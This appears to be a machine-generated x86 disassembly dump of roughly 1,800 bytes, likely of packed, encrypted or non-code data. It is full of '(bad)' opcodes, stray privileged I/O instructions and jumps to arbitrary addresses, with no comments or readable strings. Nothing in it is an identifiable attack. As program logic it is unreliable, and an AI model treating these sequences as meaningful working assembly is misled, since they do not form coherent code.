  41a090:	arpl   cx,bp
  41a092:	cmp    DWORD PTR [esp+ebx*8],ecx
  41a095:	xchg   ecx,ecx
  41a097:	fsubr  st,st(1)
  41a099:	mov    bl,0x2c
  41a09b:	xchg   esp,eax
  41a09c:	mov    cl,0x97
  41a09e:	(bad)  
  41a09f:	fdivr  QWORD PTR [ecx+0x4a]
  41a0a2:	mov    eax,esi
  41a0a4:	xchg   BYTE PTR [eax],al
  41a0a6:	lock xchg ebp,eax
  41a0a8:	adc    eax,0xd6c94db2
  41a0ad:	jbe    0x41a0a0
  41a0af:	or     BYTE PTR [ebx],bl
  41a0b1:	pop    ebx
  41a0b2:	retf   
  41a0b3:	ja     0x41a0b5
  41a0b5:	outs   dx,DWORD PTR ds:[esi]
  41a0b6:	sbb    al,0xb
  41a0b8:	cli    
  41a0b9:	jbe    0x41a0bb
  41a0bb:	inc    esp
  41a0bc:	jns    0x41a05e
  41a0be:	sub    esi,DWORD PTR cs:[esi]
  41a0c1:	inc    esp
  41a0c2:	jns    0x41a0cc
  41a0c4:	xchg   esi,eax
  41a0c5:	stc    
  41a0c6:	jnp    0x41a0eb
  41a0c8:	stos   BYTE PTR es:[edi],al
  41a0c9:	shl    BYTE PTR [eax],0x98
  41a0cc:	cmp    BYTE PTR [esi-0x71],0x1a
  41a0d0:	ret    
  41a0d1:	in     eax,dx
  41a0d2:	push   ss
  41a0d3:	gs sbb eax,0x6f1a562a
  41a0d9:	xor    BYTE PTR [esi],0x7f
  41a0dc:	sar    DWORD PTR [esi+0x7f],cl
  41a0df:	rcr    DWORD PTR [edx+0x5005bf62],0xfe
  41a0e6:	fsubrp st(0),st
  41a0e8:	das    
  41a0e9:	mov    bh,0x15
  41a0eb:	pusha  
  41a0ec:	lods   al,BYTE PTR ds:[esi]
  41a0ed:	loopne 0x41a13f
  41a0ef:	xchg   esi,eax
  41a0f0:	cdq    
  41a0f1:	mov    cl,0x9c
  41a0f3:	repz cwde 
  41a0f5:	inc    esp
  41a0f6:	aas    
  41a0f7:	in     al,dx
  41a0f8:	shr    BYTE PTR [esp+eax*2],0x1b
  41a0fc:	xchg   ebp,eax
  41a0fd:	adc    dh,BYTE PTR [ebx+0x50ef2d3f]
  41a103:	push   esp
  41a104:	cmp    eax,0xfc0ff0d8
  41a109:	cdq    
  41a10a:	pusha  
  41a10b:	ffreep st(7)
  41a10d:	mov    ds:0x95e170ff,eax
  41a112:	pusha  
  41a113:	leave  
  41a114:	cli    
  41a115:	loopne 0x41a155
  41a117:	ror    edi,0xc0
  41a11a:	dec    edi
  41a11b:	sub    DWORD PTR [edx+0x793772d9],ebp
  41a121:	sar    BYTE PTR [esi-0x30],0x5f
  41a125:	or     BYTE PTR [esi],bl
  41a127:	lahf   
  41a128:	mov    cl,BYTE PTR ds:[ebp-0x6cbf39ee]
  41a12f:	stos   DWORD PTR es:[edi],eax
  41a130:	and    DWORD PTR [ecx],0x38
  41a133:	add    eax,0xfc5b1e80
  41a138:	not    BYTE PTR [eax+edi*2]
  41a13b:	jnp    0x41a0d1
  41a13d:	lock outs dx,BYTE PTR ds:[esi]
  41a13f:	or     dl,BYTE PTR [ebp-0x26]
  41a142:	cmp    eax,0x4cc49d62
  41a147:	xor    edx,DWORD PTR [ebx+0x49d7075e]
  41a14d:	xchg   esi,eax
  41a14e:	dec    ebx
  41a14f:	fsubr  DWORD PTR [edx+0x19]
  41a152:	rcr    cl,1
  41a154:	add    BYTE PTR ds:0xf541ad57,bl
  41a15a:	xchg   edi,eax
  41a15b:	fidiv  DWORD PTR [ebp+0x7e]
  41a15e:	push   ecx
  41a15f:	in     eax,dx
  41a160:	(bad)  [edi-0x59c855ab]
  41a166:	dec    ebx
  41a167:	pop    ds
  41a168:	imul   ecx,DWORD PTR [ebp-0x79],0xd
  41a16c:	sbb    dl,BYTE PTR [edi+0x1034d9fe]
  41a172:	out    0xd9,eax
  41a174:	jns    0x41a194
  41a176:	xchg   BYTE PTR [eax+0x6ea687c8],ah
  41a17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a17d:	sub    ecx,ecx
  41a17f:	or     bh,dl
  41a181:	ds jp  0x41a1cb
  41a184:	fnstsw WORD PTR [edi]
  41a186:	add    edi,esp
  41a188:	dec    ebp
  41a189:	or     edi,DWORD PTR [ecx+0x42]
  41a18c:	xor    BYTE PTR gs:[esi+ebp*1-0x431a486e],ah
  41a194:	leave  
  41a195:	jmp    0x6e55b50c
  41a19a:	cmp    ch,BYTE PTR [ebx-0x5828f152]
  41a1a0:	int3   
  41a1a1:	sbb    al,0xe2
  41a1a3:	xlat   BYTE PTR ds:[ebx]
  41a1a4:	pop    edx
  41a1a5:	sar    DWORD PTR [esi],cl
  41a1a7:	mov    WORD PTR [edx-0x17],ss
  41a1aa:	or     edx,edx
  41a1ac:	aam    0xdf
  41a1ae:	stos   DWORD PTR es:[edi],eax
  41a1af:	enter  0xa8c2,0x2e
  41a1b3:	jnp    0x41a198
  41a1b5:	fnstsw ax
  41a1b7:	jb     0x41a199
  41a1b9:	jnp    0x41a166
  41a1bb:	pop    ss
  41a1bc:	(bad)  
  41a1bd:	xlat   BYTE PTR ds:[ebx]
  41a1be:	xchg   ebp,eax
  41a1bf:	jnp    0x41a18d
  41a1c1:	arpl   WORD PTR [eax],si
  41a1c3:	and    BYTE PTR [esi+0x71],ch
  41a1c6:	test   al,0x9c
  41a1c8:	xchg   ebx,eax
  41a1c9:	cmp    dh,BYTE PTR [esi]
  41a1cb:	xchg   ebp,eax
  41a1cc:	add    eax,0x1e099840
  41a1d1:	outs   dx,BYTE PTR ds:[esi]
  41a1d2:	ja     0x41a1d4
  41a1d4:	(bad)  
  41a1d5:	xchg   edx,eax
  41a1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1d7:	mov    dl,0x59
  41a1d9:	mov    ebp,0x6ac76832
  41a1de:	push   eax
  41a1df:	pop    esi
  41a1e0:	mov    WORD PTR [edx+0xc24e7ba],gs
  41a1e6:	mov    esi,0x405ed64a
  41a1eb:	xchg   BYTE PTR [edx-0x5d57fd95],al
  41a1f1:	or     DWORD PTR [edi+0x64],0x1fa0f8b
  41a1f8:	in     eax,dx
  41a1f9:	cmp    ah,dl
  41a1fb:	jns    0x41a1a7
  41a1fd:	dec    ecx
  41a1fe:	test   al,0x7a
  41a200:	xor    DWORD PTR [ecx-0x13],esp
  41a203:	sub    al,0x63
  41a205:	imul   ebp,eax,0x5e
  41a208:	cmp    BYTE PTR [edi+0x31],0x74
  41a20c:	pop    esi
  41a20d:	cmp    eax,0xcc9ff508
  41a212:	dec    ebx
  41a213:	xor    bh,BYTE PTR [ecx+edi*1]
  41a216:	loopne 0x41a1d5
  41a218:	mov    bh,0x7c
  41a21a:	pop    esp
  41a21b:	imul   eax,DWORD PTR [edi+0x0],0x0
  41a222:	sbb    BYTE PTR [ebp+0xe],dl
  41a225:	add    eax,0x5d1b5f4f
  41a22a:	lods   eax,DWORD PTR ds:[esi]
  41a22b:	test   al,0x5b
  41a22d:	gs into 
  41a22f:	fnstcw WORD PTR [ecx]
  41a231:	(bad)  
  41a232:	mov    dh,0x1e
  41a234:	add    DWORD PTR [eax],eax
  41a236:	repz add al,0x0
  41a239:	add    BYTE PTR [edx],ah
  41a23b:	inc    esp
  41a23c:	lods   eax,DWORD PTR ds:[esi]
  41a23d:	outs   dx,BYTE PTR ds:[esi]
  41a23e:	out    0x5a,eax
  41a240:	popf   
  41a241:	ins    BYTE PTR es:[edi],dx
  41a242:	nop
  41a243:	xchg   ebp,ebp
  41a245:	sbb    ah,BYTE PTR [ebx+0x22]
  41a248:	mov    al,0x6
  41a24a:	cmc    
  41a24b:	xor    eax,0x9511ca62
  41a250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a251:	xor    ebp,eax
  41a253:	mov    cl,0xcf
  41a255:	fnstenv [ebp-0x55]
  41a258:	push   es
  41a259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25a:	ja     0x41a2ba
  41a25c:	test   BYTE PTR [ecx],ch
  41a25e:	mov    ah,0x79
  41a260:	pop    esi
  41a261:	fadd   QWORD PTR [edx]
  41a263:	icebp  
  41a264:	push   ss
  41a265:	push   ecx
  41a266:	mov    ds:0x901b7a1c,al
  41a26b:	sub    dh,bl
  41a26d:	out    dx,al
  41a26e:	add    edx,0x5
  41a271:	push   edx
  41a272:	retf   
  41a273:	gs mov cl,0xd9
  41a276:	sahf   
  41a277:	xchg   esp,eax
  41a278:	xchg   esi,eax
  41a279:	lea    edx,[ecx-0x66cd8908]
  41a27f:	add    eax,0xde2b26db
  41a284:	pop    esp
  41a285:	test   BYTE PTR [eax+0x6e],0xe6
  41a289:	add    ecx,ebp
  41a28b:	pop    ds
  41a28c:	adc    eax,0xd57e311a
  41a291:	xchg   edx,eax
  41a292:	test   bl,bl
  41a294:	pusha  
  41a295:	test   ecx,eax
  41a297:	pop    esp
  41a298:	addr16 or eax,0xc20e3972
  41a29e:	pop    esp
  41a29f:	inc    edi
  41a2a0:	rcl    BYTE PTR [edx+0x10],1
  41a2a3:	xchg   esp,eax
  41a2a5:	adc    BYTE PTR [ebp+0xc],dh
  41a2a8:	jle    0x41a257
  41a2aa:	mov    eax,0xe8f74e8e
  41a2af:	cmp    ebp,DWORD PTR [esi]
  41a2b1:	imul   ebx,DWORD PTR ds:0xae41a818,0x4b
  41a2b8:	sar    dh,0x1e
  41a2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2bc:	mov    esi,DWORD PTR [eax-0x7a]
  41a2bf:	add    BYTE PTR [ecx],ch
  41a2c1:	leave  
  41a2c2:	xor    BYTE PTR [esi+0xe],bl
  41a2c5:	mov    ds:0xe5bd7eb7,eax
  41a2ca:	fs inc ebx
  41a2cc:	jmp    0x41a2e1
  41a2ce:	pop    ecx
  41a2cf:	sldt   WORD PTR [ebx+0x7ecf861]
  41a2d6:	xchg   ah,bh
  41a2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2d9:	test   al,0xbd
  41a2db:	xchg   edx,eax
  41a2dc:	push   cs
  41a2dd:	jg     0x41a322
  41a2df:	push   ecx
  41a2e0:	push   ss
  41a2e1:	jbe    0x41a2ed
  41a2e3:	arpl   WORD PTR [ebx],sp
  41a2e5:	enter  0x88a3,0xa4
  41a2e9:	xor    BYTE PTR [edx-0x33],dl
  41a2ec:	dec    ebx
  41a2ed:	cmp    bl,BYTE PTR [ebp-0x3f]
  41a2f0:	aaa    
  41a2f1:	std    
  41a2f2:	sbb    eax,0x81b8b065
  41a2f7:	mov    ebx,0xf3cdf03c
  41a2fc:	jl     0x41a286
  41a2fe:	and    eax,0x8f1c9535
  41a303:	nop
  41a304:	leave  
  41a305:	fsub   QWORD PTR [eax+0x6e]
  41a308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a309:	mov    esp,edx
  41a30b:	sbb    DWORD PTR [esi],ecx
  41a30d:	sbb    al,BYTE PTR [ebx-0x33a91918]
  41a313:	add    BYTE PTR [ebx-0x32],bh
  41a316:	jp     0x41a2cf
  41a318:	sbb    DWORD PTR ds:0xb1f7ec49,ebp
  41a31e:	sahf   
  41a31f:	fistp  QWORD PTR [ebp-0x344f9733]
  41a325:	dec    esi
  41a326:	test   DWORD PTR [eax],0x3cbc0f7c
  41a32c:	push   ss
  41a32d:	mov    ds:0x171e90c4,eax
  41a332:	xadd   esi,ebx
  41a335:	ror    edx,0xda
  41a338:	add    BYTE PTR [esp+eax*2],bl
  41a33b:	fisttp QWORD PTR [esi+0x5]
  41a33e:	and    DWORD PTR [edx],ebx
  41a340:	clc    
  41a341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a342:	mov    al,ds:0xd0c32cf0
  41a347:	xchg   edi,eax
  41a348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a349:	sbb    eax,0x27a45e1d
  41a34e:	push   ss
  41a34f:	pusha  
  41a350:	sbb    eax,0xd4d6fe0a
  41a355:	lods   eax,DWORD PTR ds:[esi]
  41a356:	dec    eax
  41a357:	sub    edx,DWORD PTR [edx]
  41a359:	dec    ebx
  41a35a:	stc    
  41a35b:	push   ecx
  41a35c:	popf   
  41a35d:	das    
  41a35e:	test   al,0x3d
  41a360:	sti    
  41a361:	rol    DWORD PTR [ebp+0x62],cl
  41a364:	stos   DWORD PTR es:[edi],eax
  41a365:	into   
  41a366:	fldenv [ebx]
  41a368:	dec    ecx
  41a369:	(bad)  
  41a36a:	loopne 0x41a3a4
  41a36c:	xlat   BYTE PTR ds:[ebx]
  41a36d:	jecxz  0x41a363
  41a36f:	dec    ebx
  41a370:	loop   0x41a3b5
  41a372:	fsub   DWORD PTR [edi]
  41a374:	test   eax,0x14163cf0
  41a379:	dec    edi
  41a37a:	sahf   
  41a37b:	ja     0x41a3d8
  41a37d:	mov    BYTE PTR [edi],0x37
  41a380:	xor    al,0x1
  41a382:	in     eax,dx
  41a383:	nop
  41a384:	xchg   esi,eax
  41a385:	test   edx,edi
  41a387:	pop    ecx
  41a388:	jno    0x41a38d
  41a38a:	mov    eax,0x67493721
  41a38f:	xor    ch,bh
  41a391:	and    eax,0xef6a134
  41a396:	dec    edi
  41a397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a398:	xchg   DWORD PTR [edx-0x1fc804d6],eax
  41a39e:	aas    
  41a39f:	outs   dx,DWORD PTR ds:[esi]
  41a3a0:	loope  0x41a3c2
  41a3a2:	lea    edx,[ecx+esi*2+0x21]
  41a3a6:	xor    bh,0xfa
  41a3a9:	fst    QWORD PTR [eax]
  41a3ab:	int3   
  41a3ac:	jmp    0x41a3c0
  41a3ae:	cs dec ebp
  41a3b0:	xor    al,0x21
  41a3b2:	dec    esp
  41a3b3:	stos   DWORD PTR es:[edi],eax
  41a3b4:	or     DWORD PTR [edi-0x7add4676],edx
  41a3ba:	scas   eax,DWORD PTR es:[edi]
  41a3bb:	inc    ebp
  41a3bc:	push   ds
  41a3bd:	adc    al,0x6
  41a3bf:	mov    esi,0xc6e6bd44
  41a3c4:	jmp    0x41a3c7
  41a3c6:	js     0x41a3ea
  41a3c8:	mov    DWORD PTR [ebp+0x3d],0x2bae69b6
  41a3cf:	ins    DWORD PTR es:[edi],dx
  41a3d0:	jns    0x41a367
  41a3d2:	leave  
  41a3d3:	nop
  41a3d4:	pop    edx
  41a3d5:	mov    bp,bp
  41a3d8:	pop    es
  41a3d9:	call   0x18114345
  41a3de:	ds in  al,0xb1
  41a3e1:	pushf  
  41a3e2:	mov    ebx,0xf1c87e37
  41a3e7:	das    
  41a3e8:	xchg   ebx,eax
  41a3e9:	(bad)  
  41a3ea:	lds    esi,FWORD PTR [ecx]
  41a3ec:	repz push ecx
  41a3ee:	and    bh,BYTE PTR [eax]
  41a3f0:	sub    al,0x6e
  41a3f2:	push   ds
  41a3f3:	pusha  
  41a3f4:	cmp    esi,DWORD PTR [ebp-0x7b]
  41a3f7:	mov    al,ds:0xba849f8a
  41a3fc:	scas   al,BYTE PTR es:[edi]
  41a3fd:	adc    ecx,edi
  41a3ff:	mov    bh,0x82
  41a401:	xchg   edi,eax
  41a402:	cdq    
  41a403:	mov    cl,0x9c
  41a405:	les    esi,FWORD PTR [esi+0x1f379b2b]
  41a40b:	xchg   DWORD PTR [ecx-0x66],edi
  41a40e:	test   eax,0x8935cae6
  41a413:	daa    
  41a414:	inc    eax
  41a415:	daa    
  41a416:	cmp    al,0x2
  41a418:	sbb    eax,0x401600f3
  41a41d:	and    BYTE PTR [edi],bh
  41a41f:	ins    BYTE PTR es:[edi],dx
  41a420:	fucom  st(1)
  41a422:	in     al,dx
  41a423:	dec    ebx
  41a424:	test   eax,0x150d0f15
  41a429:	xor    edi,esp
  41a42b:	jecxz  0x41a413
  41a42d:	sahf   
  41a42e:	into   
  41a42f:	jle    0x41a417
  41a431:	mov    esi,0x771c5d1b
  41a436:	(bad)  
  41a437:	inc    ebp
  41a438:	shl    BYTE PTR [esi],cl
  41a43a:	(bad)  [edx+ecx*4]
  41a43d:	adc    BYTE PTR [edi-0x6a],al
  41a440:	cld    
  41a441:	push   edx
  41a442:	mov    BYTE PTR [ebx+ebx*8-0x7a],ah
  41a446:	frstor [ebp-0x212696f8]
  41a44c:	pusha  
  41a44d:	push   0xffffff8c
  41a44f:	gs pop ss
  41a451:	in     eax,dx
  41a452:	jmp    0xc5c3:0x1a059870
  41a459:	cmp    ebp,DWORD PTR ds:0x34e6d713
  41a45f:	dec    ecx
  41a460:	sub    DWORD PTR ds:0x82de5b06,ebx
  41a466:	imul   eax,DWORD PTR [edi-0x170b6035],0x4855d0ae
  41a470:	jge    0x41a49f
  41a472:	shl    BYTE PTR [ebx-0x367aa0f8],cl
  41a478:	arpl   WORD PTR [ecx],dx
  41a47a:	mov    cl,0x31
  41a47c:	sub    edx,DWORD PTR [ebp+0x7c]
  41a47f:	cld    
  41a480:	sbb    al,0xe2
  41a482:	or     eax,0x4efe4499
  41a487:	jae    0x41a4d3
  41a489:	js     0x41a4d3
  41a48b:	les    edi,FWORD PTR ds:0x6109d1e2
  41a491:	mov    eax,DWORD PTR [ecx]
  41a493:	mov    al,ds:0xfbda87f2
  41a498:	pop    eax
  41a499:	nop
  41a49a:	jae    0x41a4de
  41a49c:	dec    esi
  41a49d:	sub    al,0x19
  41a49f:	cld    
  41a4a0:	add    eax,0xdf2d73fb
  41a4a5:	jae    0x41a51b
  41a4a7:	push   edx
  41a4a8:	jb     0x41a497
  41a4aa:	stc    
  41a4ab:	ret    0x2394
  41a4ae:	pop    ebx
  41a4af:	jne    0x41a4cb
  41a4b1:	in     al,0xc5
  41a4b3:	jecxz  0x41a505
  41a4b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4b6:	shl    DWORD PTR [edi+0x2bd7e4c7],cl
  41a4bc:	leave  
  41a4bd:	in     al,dx
  41a4be:	(bad)  
  41a4bf:	sbb    BYTE PTR [ebp+0x15aef1ed],dh
  41a4c5:	dec    eax
  41a4c6:	mov    edx,0x879e306a
  41a4cb:	shr    DWORD PTR [edx-0x6f55b55],cl
  41a4d1:	xor    al,0x99
  41a4d3:	ret    
  41a4d4:	push   es
  41a4d5:	jmp    0x41a462
  41a4d7:	jmp    0xa6acc233
  41a4dc:	push   ebp
  41a4dd:	adc    eax,esi
  41a4df:	xor    al,dh
  41a4e1:	ins    DWORD PTR es:[edi],dx
  41a4e2:	(bad)  
  41a4e3:	fcmovnbe st,st(6)
  41a4e5:	rcl    BYTE PTR [esi],0x6
  41a4e8:	sub    al,0x9d
  41a4ea:	pushf  
  41a4eb:	sbb    DWORD PTR [eax+0x50fa0412],0xfea260bf
  41a4f5:	fs aas 
  41a4f7:	repz jno 0x41a4d3
  41a4fa:	aaa    
  41a4fb:	pop    edx
  41a4fc:	cmc    
  41a4fd:	fisub  WORD PTR [ebx+0xb42c15f]
  41a503:	ins    BYTE PTR es:[edi],dx
  41a504:	sub    al,BYTE PTR [esi+0x11d5b7f4]
  41a50a:	or     al,0xd8
  41a50c:	pop    eax
  41a50d:	or     BYTE PTR [ecx],cl
  41a50f:	xchg   esi,eax
  41a510:	pop    edx
  41a511:	cs fdivr st(2),st
  41a514:	or     eax,0x97711126
  41a519:	push   ds
  41a51a:	shr    DWORD PTR [eax],1
  41a51c:	imul   DWORD PTR [edx-0x7a5a93e]
  41a522:	adc    eax,0x82d1f9b8
  41a527:	ds dec eax
  41a529:	mov    cx,0x8f78
  41a52d:	sbb    ecx,DWORD PTR [eax+edi*8-0x73687c9b]
  41a534:	aam    0x94
  41a536:	push   cs
  41a537:	mov    edx,0x421856b
  41a53c:	push   eax
  41a53d:	fs add bp,di
  41a541:	mov    ebx,0xded8a412
  41a546:	aas    
  41a547:	xchg   ecx,eax
  41a548:	scas   eax,DWORD PTR es:[edi]
  41a549:	(bad)  
  41a54a:	sar    BYTE PTR [esi],0xc2
  41a54d:	cmc    
  41a54e:	mov    eax,0x6cfc51c7
  41a553:	pop    eax
  41a554:	mov    esi,0x57694d5d
  41a559:	lea    eax,[esi]
  41a55b:	mov    ds:0x3902cc93,al
  41a560:	std    
  41a561:	cmc    
  41a562:	xchg   ecx,eax
  41a563:	mov    ah,0x9b
  41a565:	sti    
  41a566:	(bad)  
  41a567:	fdivr  QWORD PTR ds:0xa951d812
  41a56d:	adc    eax,0xf9ff8335
  41a572:	jle    0x41a56a
  41a574:	xchg   ebp,eax
  41a575:	addr16 xchg esi,eax
  41a577:	xchg   DWORD PTR [ecx],ebp
  41a579:	xor    DWORD PTR [eax],ebp
  41a57b:	outs   dx,DWORD PTR ds:[esi]
  41a57c:	ret    0xfc0d
  41a57f:	pushf  
  41a580:	mov    eax,DWORD PTR [ebp-0x33]
  41a583:	ss xchg esp,eax
  41a585:	pop    es
  41a586:	mov    dl,0xec
  41a588:	out    0x28,eax
  41a58a:	adc    DWORD PTR [edi+0x7031fe30],edi
  41a590:	lds    ecx,FWORD PTR [ecx-0x50]
  41a593:	jmp    0x41a519
  41a595:	int3   
  41a596:	push   esi
  41a597:	pop    esp
  41a598:	mov    ds:0xdcce3b4a,al
  41a59d:	jmp    0xf7c7a4d
  41a5a2:	push   esp
  41a5a3:	add    cl,al
  41a5a5:	sbb    BYTE PTR [edx-0xdc59e1e],0xa
  41a5ac:	pop    eax
  41a5ad:	test   al,0x86
  41a5af:	sub    eax,0xc08195f2
  41a5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b5:	cmp    eax,DWORD PTR [edi]
  41a5b7:	and    BYTE PTR [ebp+0x48f55764],bl
  41a5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5be:	adc    al,0xee
  41a5c0:	adc    DWORD PTR [edi-0xbd51028],esi
  41a5c6:	inc    eax
  41a5c7:	popa   
  41a5c8:	in     eax,dx
  41a5c9:	sub    DWORD PTR [esp+ebp*4-0x24],0xa8090bdc
  41a5d1:	lods   al,BYTE PTR ds:[esi]
  41a5d2:	mov    ds:0x280082f8,eax
  41a5d7:	rcl    BYTE PTR [edx],cl
  41a5d9:	iret   
  41a5da:	fwait
  41a5db:	ret    0xcd4d
  41a5de:	mov    ch,0xa1
  41a5e0:	push   ds
  41a5e1:	add    ebp,esi
  41a5e3:	imul   esp,DWORD PTR ds:0x7cba4522,0x83bd36a4
  41a5ed:	cmp    al,0xc3
  41a5ef:	and    al,0x4b
  41a5f1:	lds    ebx,FWORD PTR [eax+0x6f]
  41a5f4:	xor    dh,BYTE PTR [edx-0x7e13c863]
  41a5fa:	pop    es
  41a5fb:	pop    ebx
  41a5fc:	ror    BYTE PTR [eax-0x3424e7d9],0xca
  41a603:	pusha  
  41a604:	xchg   ebx,eax
  41a605:	mov    BYTE PTR [eax-0x9e0938e],al
  41a60b:	or     al,0x5
  41a60d:	mov    esp,0x86c5d100
  41a612:	in     al,dx
  41a613:	pop    es
  41a614:	xchg   ebx,eax
  41a615:	inc    ebx
  41a616:	push   ecx
  41a617:	ins    DWORD PTR es:[edi],dx
  41a618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a619:	and    DWORD PTR [edi+0x539bcd3d],edi
  41a61f:	lahf   
  41a620:	push   ss
  41a621:	iret   
  41a622:	dec    ebx
  41a623:	mov    ah,0xd1
  41a625:	imul   edx,DWORD PTR [ebx],0x22
  41a628:	cmp    al,0xad
  41a62b:	mov    cl,0xfd
  41a62d:	das    
  41a62e:	call   0x4c55:0x316cf94f
  41a635:	inc    si
  41a637:	imul   esp,edx,0x4f
  41a63a:	sbb    ch,BYTE PTR [ecx-0xb]
  41a63d:	mov    ds:0xd33286e5,al
  41a642:	mov    ds:0x7b96c186,al
  41a647:	int3   
  41a648:	sub    dh,BYTE PTR [eax-0x2c]
  41a64b:	int    0x4d
  41a64d:	mov    ch,0x90
  41a64f:	lods   al,BYTE PTR ds:[esi]
  41a650:	adc    ch,BYTE PTR [edx-0x52]
  41a653:	or     bl,BYTE PTR [ecx+0x42]
  41a656:	mov    DWORD PTR [esi+0x725fe981],edi
  41a65c:	mov    ds:0xdc9dff7,eax
  41a661:	shl    edi,1
  41a663:	jno    0x41a646
  41a665:	xchg   edi,eax
  41a666:	mov    ebx,0xcaa706fc
  41a66b:	dec    eax
  41a66c:	mov    gs,ecx
  41a66e:	stos   BYTE PTR es:[edi],al
  41a66f:	push   ss
  41a670:	jb     0x41a6cd
  41a672:	mov    ds:0xe7317708,al
  41a677:	cmp    eax,0x3c227b1
  41a67c:	mov    esi,0x57dde020
  41a681:	inc    eax
  41a682:	sti    
  41a683:	paddsw mm3,mm5
  41a686:	dec    edi
  41a687:	popf   
  41a688:	jg     0x41a6ac
  41a68a:	popf   
  41a68b:	xchg   ebp,eax
  41a68c:	repz xlat BYTE PTR ds:[ebx]
  41a68e:	test   edx,0x13fcedc3
  41a694:	fdiv   DWORD PTR [edx]
  41a696:	scas   eax,DWORD PTR es:[edi]
  41a697:	mov    cl,dl
  41a699:	add    BYTE PTR [ebx],al
  41a69b:	mov    al,es:0xed3291f8
  41a6a1:	xor    ecx,DWORD PTR [esi-0x46]
  41a6a4:	push   esi
  41a6a5:	mov    eax,0x9f5b6961
  41a6aa:	ficom  DWORD PTR [edi]
  41a6ac:	fucomi st,st(0)
  41a6ae:	rcl    BYTE PTR [esp+eax*4],cl
  41a6b1:	pop    ecx
  41a6b2:	lds    ebx,FWORD PTR [esp+ecx*2-0x22d174cb]
  41a6b9:	cmc    
  41a6ba:	add    eax,0xa00f57b5
  41a6bf:	les    edi,FWORD PTR [esp+eiz*8]
  41a6c2:	sbb    DWORD PTR [edi+0x33850568],0x6bd12ae1
  41a6cc:	fimul  WORD PTR [edx]
  41a6ce:	fstp   DWORD PTR [esi+ebp*2-0x70]
  41a6d2:	push   ecx
  41a6d3:	dec    ebp
  41a6d4:	es mov dl,0xe
  41a6d7:	push   edx
  41a6d8:	mov    esp,0xeb32a2ed
  41a6dd:	jmp    0x41a704
  41a6df:	sahf   
  41a6e0:	stc    
  41a6e1:	(bad)  
  41a6e2:	mov    al,ds:0x87d06b84
  41a6e7:	pop    esi
  41a6e8:	jo     0x41a70a
  41a6ea:	jo     0x41a751
  41a6ec:	add    eax,0x2ed6965e
  41a6f1:	xchg   ebx,eax
  41a6f2:	or     ebx,DWORD PTR [edi]
  41a6f4:	loope  0x41a6db
  41a6f6:	mov    ah,0xc7
  41a6f8:	(bad)  
  41a6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6fa:	xchg   DWORD PTR [esi+0x1],esp
  41a6fd:	mov    bl,al
  41a6ff:	call   0xb597:0xb26536e9
  41a706:	out    0x67,eax
  41a708:	mov    DWORD PTR [esi+eax*4+0x24],ebx
  41a70c:	dec    esp
  41a70d:	mov    ah,0x62
  41a70f:	jle    0x41a6dd
  41a711:	retf   0xc28a
  41a714:	lods   eax,DWORD PTR ds:[esi]
  41a715:	bound  esi,QWORD PTR [ecx]
  41a717:	cmp    DWORD PTR [ebx],ebp
  41a719:	ins    BYTE PTR es:[edi],dx
  41a71a:	add    eax,0x6ae193fe
  41a71f:	not    BYTE PTR [eax+0x6d]
  41a722:	push   cs
  41a723:	aaa    
  41a724:	je     0x41a774
  41a726:	dec    edi
  41a727:	lods   al,BYTE PTR ds:[esi]
  41a728:	cs jbe 0x41a729
  41a72b:	adc    BYTE PTR [ecx+0x0],0x0
  41a72f:	add    BYTE PTR [eax],al
  41a731:	add    BYTE PTR [esi+0x6f],cl
  41a734:	je     0x41a75e
  41a736:	jne    0x41a773
  41a738:	pop    esi
  41a739:	outs   dx,DWORD PTR ds:[esi]
  41a73a:	out    dx,eax
  41a73b:	aaa    
  41a73c:	jae    0x41a716
  41a73e:	and    ebp,DWORD PTR [ebp+0x23a971cd]
  41a744:	add    DWORD PTR [eax],eax
  41a746:	repz add al,0x0
  41a749:	add    BYTE PTR [eax+0x4f],ch
  41a74c:	fninit 
  41a74e:	inc    BYTE PTR [eax+0x3c]
  41a751:	pop    ecx
  41a752:	sbb    al,0xae
  41a754:	rol    DWORD PTR [ebx-0x23],1
  41a757:	loopne 0x41a6f6
  41a759:	fst    DWORD PTR [ebp+0x6c]
  41a75c:	lahf   
  41a75d:	jmp    0x1fb39e01
  41a762:	loope  0x41a6ef
  41a764:	call   0x82caf6e5
  41a769:	push   edx
  41a76a:	dec    edi
  41a76b:	push   cs
  41a76c:	sub    al,0x2e
  41a76e:	push   0xffffff9a
  41a770:	jmp    0x41a73a
  41a772:	jne    0x41a79f
  41a774:	cwde   
  41a775:	mov    cl,0x21
  41a777:	cmp    BYTE PTR [eax+edi*2-0xc],0x24
  41a77c:	jmp    0x6e2613fd
  41a781:	je     0x41a70e
  41a783:	add    ecx,ecx
  41a785:	ret    
  41a786:	int3   
  41a787:	and    DWORD PTR [edx-0x76],eax
  41a78a:	test   eax,0xb990d8ee
  41a78f:	repz pop eax
  41a791:	add    edx,DWORD PTR [ebp+0x208eed18]
  41a797:	mov    cl,0x94
  41a799:	xchg   esi,eax
  41a79a:	repnz data16 loop 0x41a812
  41a79e:	sub    esp,esi
  41a7a0:	sbb    dl,ch
  41a7a2:	imul   DWORD PTR [edi-0x65]
  41a7a5:	mov    edi,DWORD PTR [ebp-0x666e56ab]
  41a7ab:	push   cs
  41a7ac:	aas    
  41a7ad:	inc    edx
  41a7ae:	sar    DWORD PTR [edi-0x69],1
  41a7b1:	dec    eax
  41a7b2:	lock repz mov dh,0x43
  41a7b6:	in     eax,dx
  41a7b7:	outs   dx,DWORD PTR ds:[esi]
  41a7b8:	dec    ebp
  41a7b9:	loope  0x41a744
  41a7bb:	sahf   
